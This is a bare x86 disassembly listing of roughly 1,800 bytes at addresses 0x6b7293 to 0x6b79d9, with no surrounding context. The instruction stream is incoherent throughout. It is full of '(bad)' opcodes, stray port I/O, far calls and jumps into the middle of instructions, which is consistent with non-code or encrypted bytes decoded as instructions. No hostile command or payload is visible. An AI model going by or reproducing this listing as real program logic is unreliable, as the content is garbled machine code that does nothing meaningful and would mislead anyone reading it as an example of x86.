  6b7293:	js     0x6b7304
  6b7295:	mov    eax,ds:0x156da371
  6b729a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b729b:	dec    edi
  6b729c:	int3   
  6b729d:	scas   eax,DWORD PTR es:[edi]
  6b729e:	dec    esi
  6b729f:	inc    esi
  6b72a0:	xor    edx,DWORD PTR [ebp-0x4d]
  6b72a3:	mov    edx,0x7606746d
  6b72a8:	and    DWORD PTR [ebx],ebx
  6b72aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b72ab:	add    bh,dl
  6b72ad:	ins    DWORD PTR es:[edi],dx
  6b72ae:	sub    esi,ebp
  6b72b0:	cmp    BYTE PTR [esi],bl
  6b72b2:	int    0xa3
  6b72b4:	sar    BYTE PTR [ebx+0x30],0x32
  6b72b8:	fild   DWORD PTR [ebx]
  6b72ba:	sub    BYTE PTR [edx+0x0],bl
  6b72bd:	in     al,0x53
  6b72bf:	mov    al,ds:0x9223e707
  6b72c4:	in     al,0x6d
  6b72c6:	and    ecx,DWORD PTR [ebp-0x212fe0d6]
  6b72cc:	fwait
  6b72cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b72ce:	mov    esp,0x7468c33d
  6b72d3:	push   esi
  6b72d4:	in     eax,dx
  6b72d5:	xchg   ecx,eax
  6b72d6:	pop    edi
  6b72d7:	dec    esi
  6b72d8:	jbe    0x6b7337
  6b72da:	pop    edx
  6b72db:	xor    esp,esi
  6b72dd:	or     eax,0xf105adb9
  6b72e2:	pop    es
  6b72e3:	mov    dl,0x1
  6b72e5:	inc    ebp
  6b72e6:	clc    
  6b72e7:	cmp    bl,BYTE PTR [edi+0x18]
  6b72ea:	out    0xfb,eax
  6b72ec:	cs (bad) 
  6b72ef:	push   cs
  6b72f0:	push   esi
  6b72f1:	ror    DWORD PTR [ecx],1
  6b72f3:	dec    ecx
  6b72f4:	dec    edx
  6b72f5:	or     eax,0xee9becff
  6b72fa:	or     ah,BYTE PTR [ecx+0x26]
  6b72fd:	push   ebx
  6b72fe:	ins    BYTE PTR es:[edi],dx
  6b72ff:	xchg   ebp,eax
  6b7300:	retf   0xab1f
  6b7303:	mov    cl,0x19
  6b7305:	test   al,0x82
  6b7307:	leave  
  6b7308:	xchg   ecx,eax
  6b7309:	lds    edx,FWORD PTR [edi]
  6b730b:	xor    bl,BYTE PTR [edx]
  6b730d:	(bad)  
  6b730e:	out    0xbc,al
  6b7310:	in     eax,0xdd
  6b7312:	adc    ch,bl
  6b7314:	inc    edi
  6b7315:	imul   eax,DWORD PTR [eax],0x6c
  6b7318:	add    BYTE PTR [edi-0x3b],dl
  6b731b:	jns    0x6b72fa
  6b731d:	cwde   
  6b731e:	and    eax,DWORD PTR ds:0xa6d7f2fb
  6b7324:	push   esp
  6b7325:	gs jbe 0x6b72db
  6b7328:	dec    edx
  6b7329:	xchg   ecx,eax
  6b732a:	mov    ebx,0x862d75a3
  6b732f:	pop    es
  6b7330:	and    eax,0x7114a926
  6b7335:	fs cwde 
  6b7337:	int3   
  6b7338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b7339:	pushf  
  6b733a:	dec    DWORD PTR ds:0x7586f0e5
  6b7340:	in     eax,dx
  6b7341:	imul   esp,DWORD PTR [ecx],0x74f1defd
  6b7347:	ins    DWORD PTR es:[edi],dx
  6b7348:	inc    edi
  6b7349:	aas    
  6b734a:	mov    eax,0x3497546f
  6b734f:	int    0xd1
  6b7351:	fstp   TBYTE PTR [edi+0x48]
  6b7354:	mov    ebp,0xd2daffde
  6b7359:	adc    dl,ah
  6b735b:	xchg   esi,eax
  6b735c:	aad    0xbe
  6b735e:	or     DWORD PTR [edi+0x4679c05e],0x6c03d33b
  6b7368:	std    
  6b7369:	lds    ebp,FWORD PTR [edx-0x5715696b]
  6b736f:	outs   dx,DWORD PTR ds:[esi]
  6b7370:	mov    ds:0xca84981d,al
  6b7375:	sub    BYTE PTR [edi-0x19f5b93a],ah
  6b737b:	sbb    eax,0x5d1edd60
  6b7380:	adc    al,0xd
  6b7382:	std    
  6b7383:	rcr    edx,1
  6b7385:	cdq    
  6b7386:	(bad)  
  6b7387:	sub    eax,0xbd1908fc
  6b738c:	push   esi
  6b738d:	jp     0x6b733f
  6b738f:	ss ins DWORD PTR es:[edi],dx
  6b7391:	adc    bl,ch
  6b7393:	sub    al,0xb4
  6b7395:	push   ecx
  6b7396:	in     eax,dx
  6b7397:	loope  0x6b738c
  6b7399:	xor    dl,bh
  6b739b:	mov    ecx,0xe1324b23
  6b73a0:	cmovne edx,ebx
  6b73a3:	mov    ebp,0x1bc0145b
  6b73a8:	and    DWORD PTR [ecx],esi
  6b73aa:	or     eax,0x50ea8582
  6b73af:	jmp    0x6b73f4
  6b73b1:	loop   0x6b7357
  6b73b3:	xor    BYTE PTR [ebx+0x787c92e6],bh
  6b73b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b73ba:	push   ebp
  6b73bb:	push   ebp
  6b73bc:	cmp    eax,esi
  6b73be:	adc    BYTE PTR [esi+ebx*1+0x74],cl
  6b73c2:	sub    esi,DWORD PTR [ebp-0x24]
  6b73c5:	sbb    BYTE PTR [edi+ecx*4],dh
  6b73c8:	cmp    al,0x88
  6b73ca:	mov    al,0x28
  6b73cc:	mov    ecx,0x2f70cfac
  6b73d1:	adc    dh,bl
  6b73d3:	push   es
  6b73d4:	jle    0x6b7382
  6b73d6:	fcmovb st,st(1)
  6b73d8:	or     ebp,eax
  6b73da:	lock test al,0x3d
  6b73dd:	pop    esp
  6b73de:	out    0x17,eax
  6b73e0:	test   BYTE PTR [edi-0x14],dl
  6b73e3:	push   0x51510a5f
  6b73e8:	jmp    0x679443bb
  6b73ed:	and    esi,DWORD PTR [esi+0x22]
  6b73f0:	xchg   ebp,eax
  6b73f1:	and    edx,edi
  6b73f3:	loopne 0x6b7430
  6b73f5:	cdq    
  6b73f6:	push   es
  6b73f7:	dec    edx
  6b73f8:	push   edx
  6b73f9:	nop
  6b73fa:	scas   eax,DWORD PTR es:[edi]
  6b73fb:	lock outs dx,BYTE PTR ds:[esi]
  6b73fd:	test   esi,ebp
  6b73ff:	mov    bh,BYTE PTR [ebx-0x48eba650]
  6b7405:	add    DWORD PTR [eax-0x6b],0x6a1a251c
  6b740c:	dec    edi
  6b740d:	dec    esp
  6b740e:	out    dx,al
  6b740f:	add    al,0x14
  6b7411:	cdq    
  6b7412:	daa    
  6b7413:	call   0x32e1:0xf93ad537
  6b741a:	mov    edx,0xacd04e0b
  6b741f:	push   cs
  6b7420:	mov    bl,0x70
  6b7422:	push   ebx
  6b7423:	mov    edi,0xbd311e11
  6b7428:	jle    0x6b7443
  6b742a:	mov    BYTE PTR [eax],bh
  6b742c:	push   edx
  6b742d:	out    0xd2,al
  6b742f:	mov    edx,0x66e19e4e
  6b7434:	pop    ds
  6b7435:	xor    cl,ch
  6b7437:	iret   
  6b7438:	adc    eax,ecx
  6b743a:	mov    edx,DWORD PTR [edi]
  6b743c:	rcr    BYTE PTR [ebp-0x13],0x6f
  6b7440:	pop    es
  6b7441:	cmp    al,0xcd
  6b7443:	sub    BYTE PTR [esi+ecx*4-0x37d70a17],0x7f
  6b744b:	rcr    BYTE PTR [ecx+0x46],1
  6b744e:	pop    eax
  6b7450:	into   
  6b7451:	inc    esi
  6b7452:	outs   dx,DWORD PTR ds:[esi]
  6b7453:	mov    WORD PTR [esi-0x24ff202b],?
  6b7459:	push   ebx
  6b745a:	cbw    
  6b745c:	ret    
  6b745d:	pop    eax
  6b745e:	lock fistp DWORD PTR [esi+0x2f]
  6b7462:	pusha  
  6b7463:	(bad)  [ebx+0x7e9fc308]
  6b7469:	push   cs
  6b746a:	(bad)  
  6b746b:	cmc    
  6b746c:	gs popf 
  6b746e:	in     eax,0x9a
  6b7470:	scas   al,BYTE PTR es:[edi]
  6b7471:	adc    ah,BYTE PTR [eax-0xf118aa6]
  6b7477:	pop    esp
  6b7478:	and    eax,0x35621fad
  6b747d:	mov    ebx,0x249a3f58
  6b7482:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b7483:	sub    DWORD PTR [esi-0x44921bd],ebp
  6b7489:	sbb    al,0x1b
  6b748b:	mov    cl,cl
  6b748d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b748e:	test   DWORD PTR [edx],esp
  6b7490:	mov    ebp,0x84a0af3b
  6b7495:	(bad)  
  6b7496:	ds pushf 
  6b7498:	enter  0xd036,0x1a
  6b749c:	stos   DWORD PTR es:[edi],eax
  6b749d:	xchg   edi,eax
  6b749e:	aaa    
  6b749f:	add    BYTE PTR [ebp-0x3a0ed5ab],0xc2
  6b74a6:	cmp    eax,0xeccb7af5
  6b74ab:	push   ebp
  6b74ac:	loop   0x6b74a2
  6b74ae:	scas   eax,DWORD PTR es:[edi]
  6b74af:	xor    BYTE PTR [ebx],bh
  6b74b1:	in     al,dx
  6b74b2:	cmp    cl,BYTE PTR [ecx+0x5c80ad7]
  6b74b8:	mov    esp,0x9bd3d339
  6b74bd:	mov    ah,0xb6
  6b74bf:	jbe    0x6b74ad
  6b74c1:	jo     0x6b74c7
  6b74c3:	retf   0xba54
  6b74c6:	push   0xf1db46c4
  6b74cb:	and    edx,eax
  6b74cd:	xor    bh,BYTE PTR [esi]
  6b74cf:	pop    ds
  6b74d0:	mov    ebx,0xab3b8ad0
  6b74d5:	pop    ss
  6b74d6:	hlt    
  6b74d7:	pop    esi
  6b74d8:	push   cs
  6b74d9:	pop    edx
  6b74da:	push   ecx
  6b74db:	je     0x6b7503
  6b74dd:	jg     0x6b7508
  6b74df:	mov    al,ds:0xb7370b19
  6b74e4:	fistp  QWORD PTR [edi]
  6b74e6:	sub    ecx,DWORD PTR [edx-0x5b]
  6b74e9:	and    DWORD PTR [esi+eiz*8],ebp
  6b74ec:	cmp    al,0x1a
  6b74ee:	cmp    eax,0xdc891cf1
  6b74f3:	out    0xd9,eax
  6b74f5:	(bad)  
  6b74f6:	imul   ecx,ebp,0xffffffa3
  6b74f9:	mov    bl,0xd9
  6b74fb:	repz (bad) 
  6b74fd:	(bad)  
  6b74ff:	stos   DWORD PTR es:[edi],eax
  6b7500:	mov    dh,0x4d
  6b7502:	(bad)  
  6b7505:	dec    edx
  6b7506:	test   al,0x42
  6b7508:	aaa    
  6b7509:	or     eax,DWORD PTR [ebx-0x1d]
  6b750c:	es lahf 
  6b750e:	push   ds
  6b750f:	daa    
  6b7510:	nop
  6b7511:	lods   eax,DWORD PTR ds:[esi]
  6b7512:	mov    ebp,0xed057dd8
  6b7517:	adc    eax,0x62d2514f
  6b751c:	ret    
  6b751d:	aas    
  6b751e:	inc    esi
  6b751f:	or     eax,0x842c9400
  6b7524:	and    eax,0x57feb9c6
  6b7529:	mul    DWORD PTR [edi+0x70]
  6b752c:	xor    eax,0x6777588f
  6b7531:	push   cs
  6b7532:	test   BYTE PTR [edi+ebp*1-0xb],bl
  6b7536:	push   cs
  6b7537:	adc    eax,0x57876644
  6b753c:	mov    bl,0xca
  6b753e:	aam    0x1e
  6b7540:	and    ebx,DWORD PTR [ebx]
  6b7542:	inc    esi
  6b7543:	repz pop esp
  6b7545:	sub    eax,esi
  6b7547:	sub    al,0xa3
  6b7549:	pushf  
  6b754a:	pop    ds
  6b754b:	shr    DWORD PTR [edx],0xfe
  6b754e:	push   es
  6b754f:	push   edi
  6b7550:	stos   BYTE PTR es:[edi],al
  6b7551:	add    DWORD PTR ds:0x60972ff2,0xffffffbd
  6b7558:	mov    eax,0x80e26f4b
  6b755d:	in     al,dx
  6b755e:	pop    ebx
  6b755f:	or     ebp,DWORD PTR [ebx+0x342b15b]
  6b7565:	sub    BYTE PTR [ecx-0x58e13144],ah
  6b756b:	adc    eax,0x13a05f33
  6b7570:	int    0x3c
  6b7572:	push   esp
  6b7573:	in     al,dx
  6b7574:	xor    ch,BYTE PTR [ebx]
  6b7576:	sbb    cl,dl
  6b7578:	in     al,dx
  6b7579:	jns    0x6b75aa
  6b757b:	pop    ebx
  6b757c:	mov    ecx,0x17e0aed8
  6b7581:	jmp    ebx
  6b7583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b7584:	xchg   ecx,eax
  6b7585:	das    
  6b7586:	jmp    ebp
  6b7588:	cmp    BYTE PTR [ecx],0x29
  6b758b:	jl     0x6b7510
  6b758d:	ja     0x6b7603
  6b758f:	jg     0x6b75e8
  6b7591:	push   0xffffffdd
  6b7593:	push   0x1d
  6b7595:	inc    esp
  6b7596:	rcl    DWORD PTR [ebx],cl
  6b7598:	mov    ecx,0xb64f748d
  6b759d:	leave  
  6b759e:	xor    BYTE PTR [ebp+esi*1-0x1c5e74c3],0x90
  6b75a6:	(bad)  
  6b75a7:	out    dx,eax
  6b75a8:	or     al,0x7c
  6b75aa:	mov    ch,0x68
  6b75ac:	sub    al,0xab
  6b75ae:	jbe    0x6b75c3
  6b75b0:	adc    bh,BYTE PTR [ebp+0xf1c83fc]
  6b75b6:	adc    eax,0xd58a67ea
  6b75bb:	push   eax
  6b75bc:	repnz pop ds
  6b75be:	mov    ds:0x30e91318,al
  6b75c3:	mov    eax,ds:0x1823c63f
  6b75c8:	std    
  6b75c9:	cmp    ebx,DWORD PTR [eax]
  6b75cb:	sub    ah,BYTE PTR [edx-0x79]
  6b75ce:	cld    
  6b75cf:	(bad)  
  6b75d0:	in     al,0x1d
  6b75d2:	das    
  6b75d3:	xchg   esp,eax
  6b75d4:	push   edx
  6b75d5:	sub    eax,esp
  6b75d7:	inc    edi
  6b75d8:	fcmovnu st,st(5)
  6b75da:	or     eax,0x7891cd2c
  6b75df:	mov    edx,0x251eb587
  6b75e4:	test   BYTE PTR [ebp+0xb42d77e],bl
  6b75ea:	adc    ebx,ebx
  6b75ec:	jl     0x6b760d
  6b75ee:	mov    bh,0x58
  6b75f0:	cs inc ecx
  6b75f2:	dec    esi
  6b75f3:	mov    ebx,0x5f9452a4
  6b75f8:	sub    edx,edi
  6b75fa:	(bad)  
  6b75fb:	pop    edx
  6b75fc:	out    0xe5,al
  6b75fe:	push   esp
  6b75ff:	jg     0x6b761d
  6b7601:	into   
  6b7602:	sub    DWORD PTR [esi+0x15],eax
  6b7605:	les    esp,FWORD PTR [edi-0x78a712b4]
  6b760b:	mov    edx,0xe48159e2
  6b7610:	mov    eax,0xc7e6b159
  6b7615:	imul   ecx,DWORD PTR [edx],0x46deb841
  6b761b:	pop    ebp
  6b761c:	jmp    0xfefb:0x8781717f
  6b7623:	shl    DWORD PTR [ecx],1
  6b7625:	js     0x6b7624
  6b7627:	jmp    0xc0ff:0xacb07026
  6b762e:	out    dx,al
  6b762f:	and    esi,ecx
  6b7631:	lds    esp,FWORD PTR [ecx-0x2c]
  6b7634:	leave  
  6b7635:	xlat   BYTE PTR ds:[ebx]
  6b7636:	les    edx,FWORD PTR [ebx+0x11]
  6b7639:	mov    bl,0xb2
  6b763b:	dec    ecx
  6b763c:	cdq    
  6b763d:	fcomi  st,st(1)
  6b763f:	mov    dl,0xc7
  6b7641:	adc    BYTE PTR [ecx-0x5bfb9aaa],0xf3
  6b7648:	lods   eax,DWORD PTR ds:[esi]
  6b7649:	dec    edi
  6b764a:	pushf  
  6b764b:	outs   dx,BYTE PTR ds:[esi]
  6b764c:	sti    
  6b764d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b764e:	jle    0x6b763f
  6b7650:	mov    edx,0x873883fb
  6b7655:	sub    esi,DWORD PTR [esi+0x71]
  6b7658:	jno    0x6b7692
  6b765a:	or     al,0xf5
  6b765c:	add    al,0xc
  6b765e:	ins    DWORD PTR es:[edi],dx
  6b765f:	adc    eax,0x3d7c2e05
  6b7664:	mov    BYTE PTR [ecx+edi*8+0x2c9eae4a],0xb5
  6b766c:	popf   
  6b766d:	fisttp DWORD PTR [ebx-0x4e]
  6b7670:	or     al,0x2
  6b7672:	cmp    DWORD PTR [edi],ebx
  6b7674:	cmp    cl,BYTE PTR [ebx+0x34]
  6b7677:	ret    0xab72
  6b767a:	add    eax,0x52a8d60
  6b767f:	adc    dl,BYTE PTR [esi+0x431b2b2c]
  6b7685:	xor    dh,BYTE PTR [eax+0x66ec0c58]
  6b768b:	(bad)  
  6b768d:	mov    ds:0x2d5d38d4,al
  6b7692:	mov    dh,0xa8
  6b7694:	xor    al,0x8b
  6b7696:	jae    0x6b7693
  6b7698:	xor    eax,DWORD PTR [edx]
  6b769a:	call   0x6ec7:0x3e661ab5
  6b76a1:	xchg   ebx,eax
  6b76a2:	xchg   eax,edx
  6b76a4:	cdq    
  6b76a5:	das    
  6b76a6:	fimul  DWORD PTR [edi-0x6cf6773e]
  6b76ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b76ad:	cmp    eax,0xa1bfd944
  6b76b2:	sti    
  6b76b3:	xchg   edx,eax
  6b76b4:	xor    eax,0xc73d6bd4
  6b76b9:	sbb    al,0xe7
  6b76bb:	out    dx,eax
  6b76bc:	leave  
  6b76bd:	or     ecx,ebp
  6b76bf:	iret   
  6b76c0:	push   edx
  6b76c1:	sti    
  6b76c2:	ins    BYTE PTR es:[edi],dx
  6b76c3:	pop    ecx
  6b76c4:	dec    ebx
  6b76c5:	cmp    ebp,esi
  6b76c7:	jo     0x6b7715
  6b76c9:	enter  0x7799,0x66
  6b76cd:	sbb    ebx,esi
  6b76cf:	repz pop edx
  6b76d1:	cs cmp al,0xb4
  6b76d4:	sbb    DWORD PTR [esi+eiz*8-0x2725ce9b],ebp
  6b76db:	cmp    ah,BYTE PTR [edx-0x17310a06]
  6b76e1:	clc    
  6b76e2:	and    dl,ch
  6b76e4:	mov    esp,0xc6932436
  6b76e9:	(bad)  
  6b76ea:	cld    
  6b76eb:	cmp    esi,DWORD PTR [ebx-0xa419896]
  6b76f1:	repnz out dx,eax
  6b76f3:	hlt    
  6b76f4:	or     cl,BYTE PTR [edi+0x5268850b]
  6b76fa:	push   eax
  6b76fb:	sbb    eax,0x905e620
  6b7700:	sbb    esi,DWORD PTR [edx+0x31]
  6b7703:	ss stos BYTE PTR es:[edi],al
  6b7705:	outs   dx,BYTE PTR ds:[esi]
  6b7706:	xchg   edi,eax
  6b7707:	cmp    ch,BYTE PTR [edx-0x36]
  6b770a:	scas   eax,DWORD PTR es:[edi]
  6b770b:	dec    ebx
  6b770c:	mov    WORD PTR [edx+0x32],fs
  6b770f:	xchg   edx,eax
  6b7710:	les    esp,FWORD PTR [ecx+0x4e]
  6b7713:	inc    bp
  6b7715:	adc    dh,BYTE PTR ds:0x566b3eeb
  6b771b:	or     dl,ch
  6b771d:	(bad)  
  6b771e:	mov    edi,0x5da383a9
  6b7723:	cmp    DWORD PTR [ebx+0x1292acd9],0x624d76b0
  6b772d:	dec    ecx
  6b772e:	loope  0x6b77a8
  6b7730:	push   cs
  6b7731:	or     eax,0x79c8732a
  6b7736:	stos   BYTE PTR es:[edi],al
  6b7737:	or     al,0xd
  6b7739:	mov    ds:0x2afc912c,al
  6b773e:	xor    al,0x89
  6b7740:	cli    
  6b7741:	inc    edx
  6b7742:	jge    0x6b7714
  6b7744:	adc    ah,BYTE PTR [ebx+0x56]
  6b7747:	xchg   edx,eax
  6b7748:	es mov edi,0x9edb120
  6b774e:	int    0x13
  6b7750:	arpl   WORD PTR [esi-0x15],ax
  6b7753:	sub    al,0x7a
  6b7755:	inc    esp
  6b7756:	ret    
  6b7757:	scas   eax,DWORD PTR es:[edi]
  6b7758:	fwait
  6b7759:	jno    0x6b771c
  6b775b:	xchg   esp,eax
  6b775c:	sub    ebx,DWORD PTR [edx+edi*2-0x60]
  6b7760:	div    BYTE PTR [ebp-0x52]
  6b7763:	lahf   
  6b7764:	jp     0x6b779a
  6b7766:	or     al,0x6d
  6b7768:	pusha  
  6b7769:	nop
  6b776a:	add    al,0x52
  6b776c:	xorps  xmm2,XMMWORD PTR [eax+0x52c43620]
  6b7773:	lods   eax,DWORD PTR ds:[esi]
  6b7774:	in     eax,0x8e
  6b7776:	clc    
  6b7777:	in     al,0x62
  6b7779:	sub    dl,BYTE PTR [edi]
  6b777b:	push   ax
  6b777d:	dec    esi
  6b777e:	sbb    bl,BYTE PTR [ecx-0x6bfbbebd]
  6b7784:	and    eax,0xf158d38d
  6b7789:	dec    esi
  6b778a:	(bad)  
  6b778b:	cmp    edx,DWORD PTR [eax+0x1329dd5]
  6b7791:	and    al,0xd9
  6b7793:	out    dx,al
  6b7794:	mov    dh,0xca
  6b7796:	popa   
  6b7797:	or     BYTE PTR [eax-0x7755e558],0x96
  6b779e:	sbb    DWORD PTR [eax+0xd],edi
  6b77a1:	enter  0x2938,0xbd
  6b77a5:	cmp    al,0x50
  6b77a7:	call   0x5bb2ba32
  6b77ac:	mov    esi,0xc9e6238f
  6b77b1:	ins    DWORD PTR es:[edi],dx
  6b77b2:	and    al,0xb9
  6b77b4:	add    al,0x97
  6b77b6:	outs   dx,DWORD PTR ds:[esi]
  6b77b7:	and    DWORD PTR [edi],0xffffffa1
  6b77ba:	ja     0x6b7828
  6b77bc:	imul   BYTE PTR [edx-0x59]
  6b77bf:	push   esp
  6b77c0:	adc    eax,0xe04abb51
  6b77c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b77c6:	add    edi,ebp
  6b77c8:	repz fmul QWORD PTR [edx-0x71e6a59e]
  6b77cf:	sub    DWORD PTR [edx+0x4d],edx
  6b77d2:	enter  0x26e0,0x4d
  6b77d6:	popa   
  6b77d7:	mov    cl,0x48
  6b77d9:	xor    ah,al
  6b77db:	jmp    0x6b7829
  6b77dd:	mov    BYTE PTR [edi*8+0x14d14ff7],al
  6b77e4:	cs xor esp,edi
  6b77e7:	or     ch,dh
  6b77e9:	fcom   st(5)
  6b77eb:	push   edi
  6b77ec:	ins    DWORD PTR es:[edi],dx
  6b77ed:	pushf  
  6b77ee:	outs   dx,DWORD PTR ds:[esi]
  6b77f0:	sbb    al,0x67
  6b77f2:	out    0x19,eax
  6b77f4:	or     al,0x5b
  6b77f6:	jmp    0x6b7836
  6b77f8:	and    ah,bh
  6b77fa:	inc    ebp
  6b77fb:	jo     0x6b77bd
  6b77fd:	and    eax,0x9389a343
  6b7802:	xchg   edx,eax
  6b7803:	stos   DWORD PTR es:[edi],eax
  6b7804:	call   0xc3a3:0xf461c1c4
  6b780b:	or     DWORD PTR [ebx+0x707944ea],esi
  6b7811:	and    bh,BYTE PTR [edi]
  6b7813:	sub    eax,0x9b576dbd
  6b7818:	push   0xffffffb9
  6b781a:	mov    ds:0x531cb8e8,eax
  6b781f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b7820:	sub    DWORD PTR [ebx+ebp*4-0x4f41933d],ebp
  6b7827:	sbb    esp,ecx
  6b7829:	adc    ch,BYTE PTR [ecx+ebx*1]
  6b782c:	adc    eax,0xeb52b33
  6b7831:	jmp    0x6b7878
  6b7833:	out    0xaa,al
  6b7835:	out    dx,eax
  6b7836:	mov    esi,0x6b1b9f64
  6b783b:	add    ebp,esp
  6b783d:	push   es
  6b783e:	ja     0x6b78b9
  6b7840:	(bad)  [ebx+edi*2+0x4bb4675e]
  6b7847:	pop    esp
  6b7848:	enter  0x9f09,0x24
  6b784c:	aas    
  6b784d:	rep ins DWORD PTR es:[edi],dx
  6b784f:	ficomp DWORD PTR [edx-0xd89335e]
  6b7855:	pop    ds
  6b7856:	dec    esp
  6b7857:	aad    0x8
  6b7859:	add    DWORD PTR [edx-0x68],ebp
  6b785c:	xor    BYTE PTR [ebx-0x7d],bh
  6b785f:	cs iret 
  6b7861:	push   edx
  6b7862:	push   ebp
  6b7863:	out    dx,al
  6b7864:	cmp    al,dl
  6b7866:	xchg   dl,dl
  6b7868:	cdq    
  6b7869:	loopne 0x6b7858
  6b786b:	lahf   
  6b786c:	xchg   BYTE PTR [ecx+0x7226a8e1],al
  6b7872:	rcr    BYTE PTR [eax-0x3a88c09],1
  6b7878:	stos   BYTE PTR es:[edi],al
  6b7879:	push   0xffffffcd
  6b787b:	dec    esi
  6b787c:	repz dec eax
  6b787e:	and    BYTE PTR [edx+0x3a],0x36
  6b7882:	cli    
  6b7883:	cmp    BYTE PTR [edx],al
  6b7885:	cwde   
  6b7886:	mov    ebx,0xa29e679c
  6b788b:	xchg   edi,eax
  6b788c:	pop    edx
  6b788d:	out    0xe5,al
  6b788f:	push   es
  6b7890:	and    eax,0xf6819185
  6b7895:	clc    
  6b7896:	test   eax,0x104b1427
  6b789b:	xchg   esp,eax
  6b789c:	test   al,ah
  6b789e:	mov    ebx,0x2e9f9be6
  6b78a3:	lahf   
  6b78a4:	mov    edi,0x62192e85
  6b78a9:	popf   
  6b78aa:	push   esp
  6b78ab:	mov    eax,0x1b00d5fa
  6b78b0:	les    esp,FWORD PTR [eax-0x35815e36]
  6b78b6:	fs nop
  6b78b8:	dec    edx
  6b78b9:	scas   eax,DWORD PTR es:[edi]
  6b78ba:	xlat   BYTE PTR ds:[ebx]
  6b78bb:	or     DWORD PTR [edi],ebx
  6b78bd:	lock clc 
  6b78bf:	fs jecxz 0x6b78e1
  6b78c2:	test   al,0x4b
  6b78c4:	sahf   
  6b78c5:	jo     0x6b7943
  6b78c7:	mov    dh,0x79
  6b78c9:	ret    0x9a91
  6b78cc:	adc    eax,0x99b4b260
  6b78d1:	dec    esp
  6b78d2:	inc    ebp
  6b78d3:	test   DWORD PTR [ebp*2+0x5019f0bf],ebp
  6b78da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b78db:	stos   BYTE PTR es:[edi],al
  6b78dc:	test   BYTE PTR [edx+0x4edf2b9d],cl
  6b78e2:	cwde   
  6b78e3:	popf   
  6b78e4:	out    0x30,eax
  6b78e6:	mov    ds:0x1f5ed7cd,eax
  6b78eb:	jle    0x6b78dc
  6b78ed:	and    DWORD PTR [edi+0x6e],esi
  6b78f0:	mov    ch,0x2b
  6b78f2:	inc    esp
  6b78f3:	adc    esi,DWORD PTR [eax+0x9b35cf4]
  6b78f9:	and    DWORD PTR [ebp-0x30],0xb0fcbea9
  6b7900:	xor    esp,esi
  6b7902:	and    ebx,DWORD PTR [edi]
  6b7904:	scas   eax,DWORD PTR es:[edi]
  6b7905:	pushf  
  6b7906:	xor    BYTE PTR [esi-0x36],ah
  6b7909:	ins    BYTE PTR es:[edi],dx
  6b790a:	pop    ebx
  6b790b:	cli    
  6b790c:	es call 0xed2d6cba
  6b7912:	std    
  6b7913:	sbb    BYTE PTR [ebp-0x66b8f208],bl
  6b7919:	ret    
  6b791a:	int    0xd7
  6b791c:	adc    eax,0x4c4cdb47
  6b7921:	test   DWORD PTR [eax+0x7292211b],ebp
  6b7927:	fdivrp st(7),st
  6b7929:	xor    DWORD PTR [edx+0x62],edx
  6b792c:	imul   ecx,DWORD PTR [esi+0x66e12909],0x8ec643f1
  6b7936:	pop    esi
  6b7937:	sub    bl,dh
  6b7939:	cmovl  esp,DWORD PTR [ebx]
  6b793c:	js     0x6b7910
  6b793e:	cmp    al,0x18
  6b7940:	jg     0x6b7942
  6b7942:	sub    BYTE PTR ds:0xf5a4570c,ah
  6b7948:	adc    eax,0x77a62ade
  6b794d:	xchg   ecx,eax
  6b794e:	pop    es
  6b794f:	aaa    
  6b7950:	jmp    FWORD PTR [edx-0x6b23d6b5]
  6b7956:	mov    ds:0xfed48d14,eax
  6b795b:	aad    0x94
  6b795d:	std    
  6b795e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b795f:	mov    ch,0x93
  6b7961:	jg     0x6b799b
  6b7963:	mov    bl,0x3a
  6b7965:	mov    al,0xf4
  6b7967:	mov    edx,ebx
  6b7969:	sahf   
  6b796a:	add    al,0xd3
  6b796c:	test   BYTE PTR [ebx],bl
  6b796e:	test   edi,eax
  6b7970:	mov    ds:0xc61d7f6f,eax
  6b7975:	test   al,0x9f
  6b7977:	xchg   esi,eax
  6b7978:	in     al,0xcf
  6b797a:	arpl   ax,dx
  6b797c:	sub    dl,0x11
  6b797f:	pop    ss
  6b7980:	sbb    BYTE PTR [edi],bh
  6b7982:	and    BYTE PTR [ebp+0x16],ch
  6b7985:	or     eax,DWORD PTR [ecx]
  6b7987:	(bad)  
  6b7989:	xchg   esp,eax
  6b798a:	out    0xfc,al
  6b798c:	in     eax,0xc3
  6b798e:	xchg   ecx,eax
  6b798f:	adc    ecx,DWORD PTR [ebp+0x2c1a1eb7]
  6b7995:	aam    0xa0
  6b7997:	pop    edx
  6b7998:	test   BYTE PTR ds:0xb7ade7eb,dh
  6b799e:	mov    eax,ds:0x29c904ba
  6b79a3:	sub    BYTE PTR gs:[ebp+eiz*2-0x67],bh
  6b79a8:	in     eax,dx
  6b79a9:	lods   eax,DWORD PTR ds:[esi]
  6b79aa:	ins    BYTE PTR es:[edi],dx
  6b79ab:	ret    
  6b79ac:	ret    
  6b79ad:	popa   
  6b79ae:	jp     0x6b79c0
  6b79b0:	jne    0x6b7972
  6b79b2:	jno    0x6b79e0
  6b79b4:	push   eax
  6b79b5:	sub    ch,BYTE PTR [edx+0x241145c]
  6b79bb:	and    bh,bl
  6b79bd:	jno    0x6b79a4
  6b79bf:	icebp  
  6b79c0:	fld    QWORD PTR [eax]
  6b79c2:	and    DWORD PTR [eax-0x2b],0xffffffad
  6b79c6:	icebp  
  6b79c7:	cmc    
  6b79c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b79c9:	push   0xfffffff2
  6b79cb:	shr    DWORD PTR [esi+0x38],cl
  6b79ce:	aad    0xf5
  6b79d0:	sbb    eax,0x2a998d90
  6b79d5:	dec    edi
  6b79d7:	mov    ch,0x50
  6b79d9:	(bad)  
